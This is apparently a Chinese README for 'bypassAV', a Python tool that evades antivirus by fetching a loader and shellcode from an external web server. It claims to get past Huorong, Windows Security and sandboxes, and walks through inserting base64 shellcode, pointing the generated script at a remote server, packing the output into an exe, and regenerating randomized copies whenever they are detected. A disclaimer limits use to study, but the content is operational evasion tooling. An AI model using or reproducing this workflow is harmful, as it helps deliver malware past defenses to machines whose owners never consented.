-----

# ！！！声明！！！

本程序仅供于学习交流，请使用者遵守《中华人民共和国网络安全法》，勿将此脚本用于非授权的测试，脚本开发者不负任何连带法律责任。



### 0x01 What is？

> 作用：`python` 免杀 采用外部加载的方式加载 `loader` 和 `shellcode`
>
> 运行环境:  **`Python3`** **`Windows`** 其他环境没测试不清楚
>
> 亲测可过 `火绒` `window安全中心` 其他的自己测试，各大沙箱平台效果也还不错
>
> 默认的 `loader` 只能支持64位的 `shellcode`
>
> 懂代码的 可以自己修改对应的 `loader`

### 0x02 Install

```bash
# 创建一个虚拟环境
cd bypassAV
python -m venv venv
# 激活虚拟环境
venv\Script\active
# 安装依赖
pip install -r requirements.txt
```

### 0x03 Using

```bash
# 1. 到template目录下找到loader.txt 换成自己生成的Shllcode [base64版本]
# 激活虚拟环境
venv\Script\active
# 2.打开make.py最后一行，把url变成你一个对外的web服务
make_result('http://127.0.0.1:8899')
# 3. make.py 116行 就是默认启动本地一个 python web服务 需要自己开启
# os.system('cd %s && python -m http.server %s' % (k8, '8899'))
# 运行脚本
python make.py
# 会生成一个随机文件夹，里面的main.py就是你要的，其他的 .0 .1 .2 就是需要对外的web文件
# 最好是将main.py打包成exe 
# 怎么打包自己研究
#里面的变量都是随机的，每次被杀了 重新make一份就好了
```